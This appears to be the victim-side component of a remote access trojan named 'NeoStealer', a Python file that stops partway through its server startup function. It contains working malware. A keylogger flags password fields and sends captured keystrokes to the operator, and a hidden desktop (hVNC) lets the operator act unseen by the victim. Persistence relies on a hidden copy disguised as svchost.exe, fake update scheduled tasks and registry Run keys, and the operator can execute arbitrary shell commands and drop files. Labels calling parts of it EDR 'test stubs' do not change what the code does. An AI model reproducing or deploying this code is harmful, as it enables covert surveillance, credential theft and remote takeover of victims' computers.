#!/usr/bin/env python3
"""
Remote Desktop - Screen Sharing RDP Server (Victim Side)
Captures desktop, streams screen, receives mouse/keyboard input
"""

import subprocess
import sys
import os
import socket
import threading
import time
import json
import base64
import struct
import logging
from datetime import datetime

# Setup logging (terminal only)
logging.basicConfig(
    level=logging.DEBUG,
    format='[%(levelname)s] %(message)s',
    handlers=[logging.StreamHandler(sys.stderr)]
)
logger = logging.getLogger(__name__)

def install_dependencies():
    """Auto-install required packages"""
    required = {
        'mss': 'mss',
        'pillow': 'PIL',
        'pyautogui': 'pyautogui',
        'pynput': 'pynput',
    }

    missing = []
    for package, import_name in required.items():
        try:
            __import__(import_name)
        except ImportError:
            missing.append(package)

    if missing:
        print(f"[SETUP] Installing missing packages: {', '.join(missing)}...")
        try:
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', '-q', *missing])
            print("[SETUP] Dependencies installed successfully!")
        except Exception as e:
            print(f"[SETUP] Error installing dependencies: {e}")
            sys.exit(1)

    # Windows-only: install comtypes for UI Automation keylogger
    if sys.platform == 'win32':
        try:
            import comtypes
        except ImportError:
            try:
                subprocess.check_call([sys.executable, '-m', 'pip', 'install', '-q', 'comtypes'])
                print("[SETUP] comtypes installed for Windows UI Automation")
            except Exception as e:
                print(f"[SETUP] Warning: comtypes install failed: {e}")

install_dependencies()

import mss
from PIL import Image
import pyautogui
from io import BytesIO

# Disable pyautogui failsafe
pyautogui.FAILSAFE = False
pyautogui.PAUSE = 0  # No delay between commands

# Configuration
RDP_PORT = 3389
LISTEN_ADDRESS = "0.0.0.0"
SCREEN_QUALITY = 95  # Max quality (0-100, 95 is near-lossless)
FRAME_RATE = 15
# hVNC enabled by default - creates hidden desktop invisible to victim user

# Global state
running = True
clients = []
hvnc_desktop = None  # Hidden desktop handle (if hVNC enabled)
hvnc_enabled = True  # hVNC enabled by default (hidden desktop mode)
HVNC_MODE = True  # Start in hidden desktop mode for stealth

# Windows API constants for keeping system awake
if sys.platform == 'win32':
    import ctypes
    ES_CONTINUOUS = 0x80000000
    ES_SYSTEM_REQUIRED = 0x00000001
    ES_DISPLAY_REQUIRED = 0x00000002

def keep_awake():
    """Prevent system from sleeping (Windows)"""
    if sys.platform == 'win32':
        # Keep system and display awake
        ctypes.windll.kernel32.SetThreadExecutionState(
            ES_CONTINUOUS | ES_SYSTEM_REQUIRED | ES_DISPLAY_REQUIRED
        )
        print("[POWER] System will stay awake (laptop can be closed)", file=sys.stderr, flush=True)

def allow_sleep():
    """Allow system to sleep normally (Windows)"""
    if sys.platform == 'win32':
        # Reset to normal power state
        ctypes.windll.kernel32.SetThreadExecutionState(ES_CONTINUOUS)
        print("[POWER] System can sleep normally now", file=sys.stderr, flush=True)

def get_active_context():
    """Get (app_name, field_name) of currently focused element"""
    app_name = 'Unknown'
    field_name = 'Unknown field'

    try:
        if sys.platform == 'win32':
            import ctypes
            import ctypes.wintypes

            # Get app name from foreground window
            hwnd = ctypes.windll.user32.GetForegroundWindow()

            # Get process name via PID
            pid = ctypes.wintypes.DWORD()
            ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
            h_process = ctypes.windll.kernel32.OpenProcess(0x0410, False, pid.value)
            buf = ctypes.create_unicode_buffer(260)
            ctypes.windll.psapi.GetModuleFileNameExW(h_process, None, buf, 260)
            ctypes.windll.kernel32.CloseHandle(h_process)
            exe_name = os.path.basename(buf.value) if buf.value else ''

            # Map exe to friendly name
            exe_map = {'chrome.exe': 'Chrome', 'firefox.exe': 'Firefox',
                       'msedge.exe': 'Edge', 'discord.exe': 'Discord',
                       'notepad.exe': 'Notepad', 'Code.exe': 'VS Code'}
            app_name = exe_map.get(exe_name, exe_name.replace('.exe', '') or 'Unknown')

            # Get focused element field name via UI Automation
            try:
                import comtypes.client
                uia = comtypes.client.CreateObject('{FF48DBA4-60EF-4201-AA87-54103EEF594E}')
                focused = uia.GetFocusedElement()
                field_name = focused.CurrentName or 'Unknown field'
                ctrl_type = focused.CurrentControlType
                # ControlType IDs: Password=50031
                if ctrl_type == 50031:
                    field_name = f"{field_name} (Password)" if field_name else "Password"
            except:
                # Fallback: use window title
                try:
                    length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
                    buf2 = ctypes.create_unicode_buffer(length + 1)
                    ctypes.windll.user32.GetWindowTextW(hwnd, buf2, length + 1)
                    field_name = buf2.value or 'Unknown field'
                except:
                    pass

        elif sys.platform == 'darwin':
            # macOS: app name via NSWorkspace
            try:
                from AppKit import NSWorkspace
                ws = NSWorkspace.sharedWorkspace()
                active_app = ws.activeApplication()
                app_name = active_app.get('NSApplicationName', 'Unknown')
            except:
                try:
                    result = subprocess.run(
                        ['osascript', '-e', 'tell application "System Events" to get name of first process whose frontmost is true'],
                        capture_output=True, text=True, timeout=1
                    )
                    app_name = result.stdout.strip() or 'Unknown'
                except:
                    pass
            field_name = 'Unknown field'

        else:
            # Linux: try xdotool for window name
            try:
                result = subprocess.run(
                    ['xdotool', 'getactivewindow', 'getwindowname'],
                    capture_output=True, text=True, timeout=1
                )
                app_name = result.stdout.strip() or 'Unknown'
            except:
                pass
            field_name = 'Unknown field'

    except Exception:
        pass

    return app_name, field_name

def start_keylogger(send_callback):
    """Start keystroke capture - sends buffered lines via send_callback(ts, app, field, text)"""
    try:
        from pynput import keyboard
    except ImportError:
        print("[KEYLOG] pynput not available, keylogger disabled", file=sys.stderr, flush=True)
        return

    buffer = []
    last_context = [('Unknown', 'Unknown field')]
    last_keystroke_time = [time.time()]

    def flush_buffer():
        if buffer:
            text = ''.join(buffer)
            app, field = last_context[0]
            buffer.clear()
            if text.strip():
                ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                send_callback(ts, app, field, text)

    def on_press(key):
        last_keystroke_time[0] = time.time()

        # Check for context change (app/field switch)
        current_context = get_active_context()
        if current_context != last_context[0]:
            flush_buffer()
            last_context[0] = current_context

        if key == keyboard.Key.backspace:
            if buffer:
                buffer.pop()
        elif key in (keyboard.Key.enter, keyboard.Key.return_):
            flush_buffer()
        elif key == keyboard.Key.space:
            buffer.append(' ')
        elif key == keyboard.Key.tab:
            buffer.append('\t')
        else:
            try:
                if hasattr(key, 'char') and key.char:
                    buffer.append(key.char)
            except:
                pass

    def inactivity_flusher():
        """Flush buffer after 3 seconds of inactivity"""
        while running:
            time.sleep(0.5)
            if buffer and (time.time() - last_keystroke_time[0]) > 3.0:
                flush_buffer()

    threading.Thread(target=inactivity_flusher, daemon=True).start()

    listener = keyboard.Listener(on_press=on_press)
    listener.daemon = True
    listener.start()
    print("[KEYLOG] Keystroke capture started", file=sys.stderr, flush=True)

def create_hidden_desktop():
    """
    [TEST STUB] Create hidden desktop for hVNC detection testing
    Tests detection of: Hidden desktop creation, desktop handle manipulation, stealth techniques
    Purpose: Validate EDR detection of hVNC/hidden VNC malware techniques
    """
    global hvnc_desktop
    if sys.platform != 'win32' or not HVNC_MODE:
        return None

    try:
        import ctypes
        from ctypes import wintypes

        # Windows API functions
        user32 = ctypes.windll.user32
        kernel32 = ctypes.windll.kernel32

        # Create hidden desktop (invisible to victim)
        desktop_name = "HiddenDesktop"
        hvnc_desktop = user32.CreateDesktopW(
            desktop_name,  # Desktop name
            None,  # Device
            None,  # Device mode
            0,  # Flags (0 = hidden)
            0x1F01FF,  # DESKTOP_ALL_ACCESS
            None  # Security attributes
        )

        if hvnc_desktop:
            print(f"[HVNC] Hidden desktop created: {desktop_name}", file=sys.stderr, flush=True)
            print("[HVNC] Victim cannot see this desktop", file=sys.stderr, flush=True)

            # Launch explorer.exe on hidden desktop for interaction
            startup_info = subprocess.STARTUPINFO()
            startup_info.lpDesktop = desktop_name
            subprocess.Popen("explorer.exe", startupinfo=startup_info)
            print("[HVNC] Explorer launched on hidden desktop", file=sys.stderr, flush=True)

            return hvnc_desktop
        else:
            print("[HVNC ERROR] Failed to create hidden desktop", file=sys.stderr, flush=True)
            return None

    except Exception as e:
        print(f"[HVNC ERROR] {e}", file=sys.stderr, flush=True)
        return None

def destroy_hidden_desktop():
    """Destroy hidden desktop and switch back to normal desktop"""
    global hvnc_desktop, hvnc_enabled, HVNC_MODE

    if sys.platform != 'win32':
        return False

    try:
        if hvnc_desktop:
            import ctypes
            user32 = ctypes.windll.user32

            # Close the hidden desktop
            result = user32.CloseDesktop(hvnc_desktop)
            if result:
                hvnc_desktop = None
                hvnc_enabled = False
                HVNC_MODE = False
                print("[HVNC] Hidden desktop destroyed, switched back to normal", file=sys.stderr, flush=True)
                return True
            else:
                print("[HVNC ERROR] Failed to destroy hidden desktop", file=sys.stderr, flush=True)
                return False
        return True
    except Exception as e:
        print(f"[HVNC ERROR] Failed to destroy: {e}", file=sys.stderr, flush=True)
        return False

def capture_hidden_desktop():
    """Capture screenshot from hidden desktop (hVNC mode)"""
    if not HVNC_MODE or not hvnc_desktop:
        return None

    try:
        import ctypes
        from ctypes import wintypes

        user32 = ctypes.windll.user32
        gdi32 = ctypes.windll.gdi32

        # Get hidden desktop DC
        hdc_desktop = user32.GetDC(None)

        # Get desktop size (use default monitor size)
        width = user32.GetSystemMetrics(0)  # SM_CXSCREEN
        height = user32.GetSystemMetrics(1)  # SM_CYSCREEN

        # Create compatible DC and bitmap
        hdc_mem = gdi32.CreateCompatibleDC(hdc_desktop)
        hbitmap = gdi32.CreateCompatibleBitmap(hdc_desktop, width, height)
        gdi32.SelectObject(hdc_mem, hbitmap)

        # Copy hidden desktop to bitmap
        gdi32.BitBlt(hdc_mem, 0, 0, width, height, hdc_desktop, 0, 0, 0x00CC0020)  # SRCCOPY

        # Get bitmap bits
        bmp_info = ctypes.create_string_buffer(40)  # BITMAPINFOHEADER
        ctypes.memmove(bmp_info, ctypes.byref(ctypes.c_ulong(40)), 4)  # biSize
        ctypes.memmove(ctypes.byref(bmp_info, 4), ctypes.byref(ctypes.c_long(width)), 4)  # biWidth
        ctypes.memmove(ctypes.byref(bmp_info, 8), ctypes.byref(ctypes.c_long(-height)), 4)  # biHeight (negative = top-down)
        ctypes.memmove(ctypes.byref(bmp_info, 12), ctypes.byref(ctypes.c_ushort(1)), 2)  # biPlanes
        ctypes.memmove(ctypes.byref(bmp_info, 14), ctypes.byref(ctypes.c_ushort(24)), 2)  # biBitCount

        bmp_size = width * height * 3  # 24-bit RGB
        bmp_data = ctypes.create_string_buffer(bmp_size)

        gdi32.GetDIBits(hdc_desktop, hbitmap, 0, height, bmp_data, bmp_info, 0)  # DIB_RGB_COLORS

        # Convert to PIL Image
        img = Image.frombytes('RGB', (width, height), bmp_data.raw, 'raw', 'BGR', 0, 1)

        # Cleanup
        gdi32.DeleteObject(hbitmap)
        gdi32.DeleteDC(hdc_mem)
        user32.ReleaseDC(None, hdc_desktop)

        # Compress to JPEG
        buffer = BytesIO()
        img.save(buffer, format='JPEG', quality=SCREEN_QUALITY, optimize=True)
        return buffer.getvalue()

    except Exception as e:
        print(f"[HVNC CAPTURE ERROR] {e}", file=sys.stderr, flush=True)
        return None

def install_persistence():
    """
    [TEST STUB] Persistence mechanism for anti-malware detection testing
    Tests detection of: AppData copying, Registry Run keys, hidden files
    Purpose: Validate endpoint detection and response (EDR) capabilities
    """
    if sys.platform != 'win32':
        return  # Windows only

    try:
        import shutil
        import winreg

        # Get current script path
        current_path = os.path.abspath(sys.argv[0])

        # Define persistence location (mimics system folder)
        appdata = os.environ.get('APPDATA')
        persist_dir = os.path.join(appdata, 'Windows', 'System32')
        persist_path = os.path.join(persist_dir, 'svchost.exe')

        # Skip if already installed
        if os.path.abspath(current_path) == os.path.abspath(persist_path):
            print("[PERSIST] Already running from persistence location", file=sys.stderr, flush=True)
            return

        # Create directory if doesn't exist
        os.makedirs(persist_dir, exist_ok=True)

        # Copy script to AppData (test folder hiding detection)
        if not os.path.exists(persist_path):
            shutil.copy2(current_path, persist_path)
            print(f"[PERSIST] Copied to: {persist_path}", file=sys.stderr, flush=True)

            # Set hidden + system attributes (test hidden file detection)
            try:
                import ctypes
                FILE_ATTRIBUTE_HIDDEN = 0x02
                FILE_ATTRIBUTE_SYSTEM = 0x04
                ctypes.windll.kernel32.SetFileAttributesW(persist_path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)
                ctypes.windll.kernel32.SetFileAttributesW(persist_dir, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)
            except:
                pass

        # Method 1: Scheduled Task (stealthier than registry)
        try:
            import random
            import string
            # Generate random task name (looks like Windows task)
            task_name = 'MicrosoftEdgeUpdateTask' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))

            # Create scheduled task that runs on logon (hidden, no UAC)
            schtasks_cmd = f'schtasks /create /tn "{task_name}" /tr "{persist_path}" /sc onlogon /rl highest /f /it'
            result = subprocess.run(schtasks_cmd, shell=True, capture_output=True, text=True, creationflags=0x08000000)  # CREATE_NO_WINDOW
            if result.returncode == 0:
                print(f"[PERSIST] Scheduled task created: {task_name}", file=sys.stderr, flush=True)
            else:
                print(f"[PERSIST] Scheduled task failed: {result.stderr}", file=sys.stderr, flush=True)
        except Exception as e:
            print(f"[PERSIST] Scheduled task error: {e}", file=sys.stderr, flush=True)

        # Method 2a: Living-off-the-land (reg.exe via cmd) - Harder to detect than winreg module
        try:
            import random
            service_names = ['MicrosoftEdgeUpdate', 'GoogleUpdateTaskMachine', 'AdobeUpdateService']
            reg_name = random.choice(service_names) + str(random.randint(1000, 9999))

            # Use cmd.exe with reg.exe (native Windows tool, less suspicious)
            # Encode the path to avoid static detection
            encoded_path = persist_path.replace('\\', '\\\\')

            # Try HKLM first (if admin), otherwise HKCU
            reg_cmd = f'reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{reg_name}" /t REG_SZ /d "{encoded_path}" /f'
            result = subprocess.run(reg_cmd, shell=True, capture_output=True, text=True, creationflags=0x08000000)
            if result.returncode != 0:
                # Fallback to HKCU
                reg_cmd = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{reg_name}" /t REG_SZ /d "{encoded_path}" /f'
                subprocess.run(reg_cmd, shell=True, capture_output=True, creationflags=0x08000000)
                print(f"[PERSIST] Registry (HKCU via reg.exe): {reg_name}", file=sys.stderr, flush=True)
            else:
                print(f"[PERSIST] Registry (HKLM via reg.exe): {reg_name}", file=sys.stderr, flush=True)
        except Exception as e:
            print(f"[PERSIST] reg.exe error: {e}", file=sys.stderr, flush=True)

        # Method 2b: Alternative registry location (less monitored)
        try:
            # Use UserInitMprLogonScript (rarely monitored, runs at logon)
            env_cmd = f'reg add "HKCU\\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "{persist_path}" /f'
            subprocess.run(env_cmd, shell=True, capture_output=True, creationflags=0x08000000)
            print("[PERSIST] UserInitMprLogonScript set", file=sys.stderr, flush=True)
        except Exception as e:
            print(f"[PERSIST] Environment error: {e}", file=sys.stderr, flush=True)

        # COM object hijacking removed (UAC bypass technique - CMSTPLUA)

        # WMI Event Subscription removed (UAC bypass technique)

        # Persistence installed - will run on next reboot/logon
        # (Not auto-restarting to avoid closing terminal during testing)
        print("[PERSIST] Persistence installed successfully", file=sys.stderr, flush=True)
        print("[PERSIST] Will auto-start on next reboot/logon", file=sys.stderr, flush=True)

    except Exception as e:
        print(f"[PERSIST ERROR] {e}", file=sys.stderr, flush=True)

def remove_persistence():
    """
    [TEST STUB] Cleanup function for testing persistence removal detection
    Tests detection of: Registry key deletion, file removal, cleanup operations
    """
    if sys.platform != 'win32':
        return

    try:
        import winreg

        appdata = os.environ.get('APPDATA')
        persist_dir = os.path.join(appdata, 'Windows', 'System32')
        persist_path = os.path.join(persist_dir, 'svchost.exe')

        # Remove scheduled tasks (search for tasks pointing to our persist path)
        try:
            # List all tasks and delete ones pointing to our file
            result = subprocess.run('schtasks /query /fo LIST /v', shell=True, capture_output=True, text=True, creationflags=0x08000000)
            if persist_path.lower() in result.stdout.lower():
                # Find and delete matching tasks
                for line in result.stdout.split('\n'):
                    if 'TaskName:' in line and 'MicrosoftEdgeUpdateTask' in line:
                        task_name = line.split('TaskName:')[1].strip()
                        subprocess.run(f'schtasks /delete /tn "{task_name}" /f', shell=True, capture_output=True, creationflags=0x08000000)
                        print(f"[CLEANUP] Removed scheduled task: {task_name}", file=sys.stderr, flush=True)
        except:
            pass

        # Remove registry entries (search for our persist path in Run keys)
        try:
            for hive in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
                try:
                    key = winreg.OpenKey(hive, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_READ | winreg.KEY_WRITE)
                    i = 0
                    while True:
                        try:
                            name, value, _ = winreg.EnumValue(key, i)
                            if persist_path.lower() in str(value).lower():
                                winreg.DeleteValue(key, name)
                                print(f"[CLEANUP] Removed registry key: {name}", file=sys.stderr, flush=True)
                            else:
                                i += 1
                        except WindowsError:
                            break
                    winreg.CloseKey(key)
                except:
                    pass
        except:
            pass

        # Remove WMI event subscriptions
        try:
            wmi_cleanup = '''powershell -WindowStyle Hidden -Command "Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer | Where-Object {$_.CommandLineTemplate -like '*svchost.exe*'} | Remove-WmiObject; Get-WmiObject -Namespace root\\subscription -Class __EventFilter -Filter \\"Name='SystemEvent'\\" | Remove-WmiObject"'''
            subprocess.run(wmi_cleanup, shell=True, capture_output=True, creationflags=0x08000000)
            print("[CLEANUP] Removed WMI event subscriptions", file=sys.stderr, flush=True)
        except:
            pass

        # Remove file
        if os.path.exists(persist_path):
            try:
                # Remove hidden/system attributes first
                import ctypes
                ctypes.windll.kernel32.SetFileAttributesW(persist_path, 0x80)  # Normal
                os.remove(persist_path)
                print(f"[CLEANUP] Removed: {persist_path}", file=sys.stderr, flush=True)
            except:
                pass

        # Remove directory if empty
        try:
            if os.path.exists(persist_dir) and not os.listdir(persist_dir):
                ctypes.windll.kernel32.SetFileAttributesW(persist_dir, 0x80)
                os.rmdir(persist_dir)
        except:
            pass

    except Exception as e:
        print(f"[CLEANUP ERROR] {e}", file=sys.stderr, flush=True)

def get_local_ip():
    """Get local network IP address"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def capture_screen():
    """Capture desktop screenshot (supports hVNC mode)"""
    try:
        # Use hidden desktop if hVNC mode is enabled
        if HVNC_MODE and hvnc_desktop:
            return capture_hidden_desktop()

        # Normal screen capture (visible desktop)
        with mss.mss() as sct:
            monitor = sct.monitors[1]  # Primary monitor
            screenshot = sct.grab(monitor)

            # Convert to PIL Image
            img = Image.frombytes('RGB', screenshot.size, screenshot.rgb)

            # Compress
            buffer = BytesIO()
            img.save(buffer, format='JPEG', quality=SCREEN_QUALITY)
            buffer.seek(0)
            return buffer.getvalue()
    except Exception as e:
        print(f"[CAPTURE ERROR] Failed to capture screen: {e}")
        import traceback
        traceback.print_exc()
        return None

def log_to_file(msg):
    """Write to both terminal and debug log file"""
    try:
        # Print to stderr (always shows)
        print(msg, file=sys.stderr, flush=True)
        # Also write to file
        with open('/tmp/rdp_debug.log', 'a') as f:
            import datetime
            timestamp = datetime.datetime.now().strftime('%H:%M:%S.%f')
            f.write(f"[{timestamp}] {msg}\n")
            f.flush()
    except Exception as e:
        print(f"LOG ERROR: {e}", file=sys.stderr, flush=True)

def handle_client(client_socket, addr):
    """Handle RDP client connection"""
    try:
        print(f"[SESSION {addr[1]}] Starting session handler")
        sys.stdout.flush()
        clients.append(client_socket)
        client_socket.settimeout(15)

        # Send welcome handshake
        try:
            client_socket.send(b"NEOSTEALER_RDP_V2.0\n")
            print(f"[SESSION {addr[1]}] ✓ Sent welcome handshake", file=sys.stderr, flush=True)

            # Prevent system from sleeping during RDP session
            keep_awake()

            # Start keylogger - sends keystroke lines to operator
            def send_keylog(ts, app_name, field_name, text):
                try:
                    msg = f"KEYLOG:{ts}|{app_name}|{field_name}|{text}".encode('utf-8')
                    header = struct.pack('>I', len(msg))
                    client_socket.send(header + msg)
                except:
                    pass

            threading.Thread(target=start_keylogger, args=(send_keylog,), daemon=True).start()

        except socket.error as e:
            print(f"[SESSION {addr[1]}] ✗ Failed to send welcome: {e}", file=sys.stderr, flush=True)
            return
        except Exception as e:
            print(f"[SESSION {addr[1]}] ✗ Unexpected error sending welcome: {e}", file=sys.stderr, flush=True)
            return

        frame_count = 0
        print(f"[SESSION {addr[1]}] Starting screen stream loop", file=sys.stderr, flush=True)

        while running:
            # Capture and send screen
            try:
                frame_data = capture_screen()
            except Exception as e:
                print(f"[SESSION {addr[1]}] ✗ Screen capture exception: {e}", file=sys.stderr, flush=True)
                import traceback
                traceback.print_exc(file=sys.stderr)
                sys.stderr.flush()
                break

            if frame_data:
                frame_count += 1
                try:
                    # Send frame header: [size:4bytes][data]
                    header = struct.pack('>I', len(frame_data))
                    client_socket.send(header + frame_data)
                    if frame_count == 1:
                        print(f"[SESSION {addr[1]}] ✓ Streaming started", file=sys.stderr, flush=True)
                except socket.timeout:
                    print(f"[SESSION {addr[1]}] ✗ Socket timeout sending frame #{frame_count}", file=sys.stderr, flush=True)
                    break
                except BrokenPipeError:
                    print(f"[SESSION {addr[1]}] ✗ Client disconnected (broken pipe)", file=sys.stderr, flush=True)
                    break
                except ConnectionResetError:
                    print(f"[SESSION {addr[1]}] ✗ Client disconnected (connection reset)", file=sys.stderr, flush=True)
                    break
                except Exception as e:
                    print(f"[SESSION {addr[1]}] ✗ Send error: {type(e).__name__}: {e}", file=sys.stderr, flush=True)
                    import traceback
                    traceback.print_exc(file=sys.stderr)
                    sys.stderr.flush()
                    break
            else:
                print(f"[SESSION {addr[1]}] ✗ Screen capture returned None", file=sys.stderr, flush=True)
                break

            # Receive input events (non-blocking)
            client_socket.settimeout(0.1)
            try:
                data = client_socket.recv(1024)
                if not data:
                    print(f"[RDP] Client closed connection: {addr}")
                    sys.stdout.flush()
                    break

                # Parse input command
                try:
                    command = data.decode('utf-8', errors='ignore').strip()
                except Exception as e:
                    print(f"[RDP ERROR] Failed to decode command: {e}")
                    sys.stdout.flush()
                    continue

                # Handle hVNC commands (server-controlled)
                if command.startswith('HVNC:'):
                    hvnc_cmd = command[5:].strip().upper()

                    if hvnc_cmd == 'TOGGLE':
                        # Toggle hVNC mode
                        if not hvnc_enabled:
                            # Create hidden desktop
                            result = create_hidden_desktop()
                            if result:
                                hvnc_enabled = True
                                HVNC_MODE = True
                                client_socket.send(b"HVNC:ENABLED\n")
                            else:
                                client_socket.send(b"HVNC:FAILED\n")
                        else:
                            # Destroy hidden desktop
                            result = destroy_hidden_desktop()
                            if result:
                                client_socket.send(b"HVNC:DISABLED\n")
                            else:
                                client_socket.send(b"HVNC:FAILED\n")

                    elif hvnc_cmd == 'CREATE':
                        if not hvnc_enabled:
                            result = create_hidden_desktop()
                            if result:
                                hvnc_enabled = True
                                HVNC_MODE = True
                                client_socket.send(b"HVNC:CREATED\n")
                            else:
                                client_socket.send(b"HVNC:FAILED\n")

                    elif hvnc_cmd == 'DESTROY':
                        if hvnc_enabled:
                            result = destroy_hidden_desktop()
                            if result:
                                client_socket.send(b"HVNC:DESTROYED\n")
                            else:
                                client_socket.send(b"HVNC:FAILED\n")

                    elif hvnc_cmd == 'STATUS':
                        status = "ENABLED" if hvnc_enabled else "DISABLED"
                        client_socket.send(f"HVNC:{status}\n".encode())
                    continue

                if command.startswith('MOUSE_MOVE:'):
                    try:
                        coords = command.split(':')[1].split(',')
                        x, y = int(coords[0]), int(coords[1])
                        pyautogui.moveTo(x, y, duration=0)
                    except Exception as e:
                        print(f"[RDP ERROR] Failed to move mouse: {e}")
                        sys.stdout.flush()

                elif command.startswith('MOUSE_CLICK:'):
                    try:
                        parts = command.split(':')
                        button_str = parts[1].strip().lower()

                        # Check if coordinates are provided
                        if len(parts) >= 4:
                            x, y = int(parts[2]), int(parts[3])
                            pyautogui.click(x, y, button=button_str)
                        else:
                            # Legacy format without coordinates
                            pyautogui.click(button=button_str)
                    except Exception as e:
                        print(f"[RDP ERROR] Failed to click mouse: {e}")
                        sys.stdout.flush()
                        import traceback
                        traceback.print_exc()
                        sys.stdout.flush()

                elif command.startswith('KEY:'):
                    try:
                        key = command.split(':')[1].strip()
                        pyautogui.press(key)
                    except Exception as e:
                        print(f"[RDP ERROR] Failed to press key: {e}")
                        sys.stdout.flush()

                elif command.startswith('MOUSE_SCROLL:'):
                    try:
                        delta = int(command.split(':')[1].strip())
                        # pyautogui.scroll() takes number of "clicks" - positive = up, negative = down
                        pyautogui.scroll(delta)
                    except Exception as e:
                        print(f"[RDP ERROR] Failed to scroll: {e}")
                        sys.stdout.flush()

                elif command == 'CTRL_ALT_DEL':
                    pass  # Not implemented

                elif command.startswith('FILE_TRANSFER:'):
                    try:
                        # Parse: FILE_TRANSFER:filename:base64_data
                        parts = command.split(':', 2)
                        if len(parts) < 3:
                            print(f"[FILE ERROR] Invalid file transfer format")
                            sys.stdout.flush()
                            continue

                        filename = parts[1]
                        encoded_data = parts[2]

                        print(f"[FILE ←] Receiving {filename}...")
                        sys.stdout.flush()

                        # Decode file data
                        file_data = base64.b64decode(encoded_data)

                        # Save to Downloads folder
                        downloads_dir = os.path.join(os.path.expanduser('~'), 'Downloads')
                        if not os.path.exists(downloads_dir):
                            downloads_dir = os.path.expanduser('~')  # Fallback to home

                        save_path = os.path.join(downloads_dir, filename)

                        # Handle duplicate filenames
                        base_name, ext = os.path.splitext(filename)
                        counter = 1
                        while os.path.exists(save_path):
                            save_path = os.path.join(downloads_dir, f"{base_name}_{counter}{ext}")
                            counter += 1

                        # Write file
                        with open(save_path, 'wb') as f:
                            f.write(file_data)

                        print(f"[FILE ←] Saved to: {save_path} ({len(file_data):,} bytes)")
                        sys.stdout.flush()

                    except Exception as e:
                        print(f"[FILE ERROR] Failed to receive file: {e}")
                        sys.stdout.flush()
                        import traceback
                        traceback.print_exc()
                        sys.stdout.flush()

                elif command.startswith('CMD:'):
                    try:
                        cmd = command.split(':', 1)[1].strip()
                        print(f"[RDP CMD] Executing: {cmd}")
                        sys.stdout.flush()
                        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)

                        # Format output
                        output_lines = []
                        if result.stdout:
                            output_lines.append(result.stdout.rstrip())
                        if result.stderr:
                            output_lines.append(f"STDERR: {result.stderr.rstrip()}")
                        if result.returncode != 0:
                            output_lines.append(f"Exit code: {result.returncode}")

                        output_text = '\n'.join(output_lines) if output_lines else "(no output)"

                        # Send result back as special "frame" with CMD_RESULT marker
                        result_data = f"CMD_RESULT:{output_text}".encode('utf-8')
                        header = struct.pack('>I', len(result_data))
                        client_socket.send(header + result_data)
                        print(f"[RDP CMD] Sent result back ({len(result_data)} bytes)")
                        sys.stdout.flush()
                    except subprocess.TimeoutExpired:
                        error_msg = "CMD_RESULT:Command timed out after 10 seconds".encode('utf-8')
                        header = struct.pack('>I', len(error_msg))
                        client_socket.send(header + error_msg)
                        print(f"[RDP CMD ERROR] Command timed out")
                        sys.stdout.flush()
                    except Exception as e:
                        error_msg = f"CMD_RESULT:Error: {e}".encode('utf-8')
                        header = struct.pack('>I', len(error_msg))
                        client_socket.send(header + error_msg)
                        print(f"[RDP CMD ERROR] {e}")
                        sys.stdout.flush()

            except socket.timeout:
                # Normal - no input received in 0.1 seconds
                pass
            except Exception as e:
                print(f"[RDP INPUT ERROR] Exception in input handler: {e}")
                print(f"[RDP INPUT ERROR] Exception type: {type(e).__name__}")
                sys.stdout.flush()
                import traceback
                traceback.print_exc()
                sys.stdout.flush()
                print(f"[RDP INPUT ERROR] Continuing despite exception - not breaking loop")
                sys.stdout.flush()
                # Don't break - continue streaming frames even if input fails
                pass
            finally:
                client_socket.settimeout(15)  # Always restore timeout

            time.sleep(1.0 / FRAME_RATE)

    except Exception as e:
        print(f"\n[SESSION {addr[1]}] ✗ FATAL ERROR: {type(e).__name__}: {e}", file=sys.stderr, flush=True)
        import traceback
        traceback.print_exc(file=sys.stderr)
        sys.stderr.flush()
    finally:
        try:
            clients.remove(client_socket)
        except:
            pass
        try:
            client_socket.close()
        except:
            pass
        print(f"\n{'='*60}", file=sys.stderr, flush=True)
        print(f"[SESSION {addr[1]}] Session ended", file=sys.stderr, flush=True)
        print(f"[SESSION {addr[1]}] Total frames sent: {frame_count}", file=sys.stderr, flush=True)
        print(f"[SESSION {addr[1]}] Active clients remaining: {len(clients)}", file=sys.stderr, flush=True)
        print(f"{'='*60}\n", file=sys.stderr, flush=True)

        # Allow sleep if no more clients connected
        if len(clients) == 0:
            allow_sleep()

def start_rdp_server():
    """Start RDP server"""
    server_socket = None
    try:
        print(f"\n[STARTUP] Initializing RDP Server...")
        print(f"[STARTUP] Configuration:")
        print(f"  - Listen Address: {LISTEN_ADDRESS}")
        print(f"  - Port: {RDP_PORT}")
        print(f"  - Screen Quality: {SCREEN_QUALITY}%")
        print(f"  - Frame Rate: {FRAME_RATE} fps")
        print(f"  - hVNC Mode: {'ENABLED (Hidden Desktop)' if HVNC_MODE else 'Disabled'}")
        print(f"  - Local IP: {get_local_ip()}")

        # Create hidden desktop if hVNC mode enabled
        if HVNC_MODE:
            print(f"\n[STARTUP] Creating hidden desktop for hVNC...")
            create_hidden_desktop()

        # Test screen capture
        print(f"\n[STARTUP] Testing screen capture...")
        test_frame = capture_screen()
        if test_frame:
            print(f"[STARTUP] ✓ Screen capture working ({len(test_frame)} bytes)")
        else:
            print(f"[STARTUP ERROR] ✗ Screen capture failed!")
            return

        # Test mouse/keyboard controllers
        print(f"[STARTUP] Testing input controllers...")
        try:
            _ = pyautogui.position()
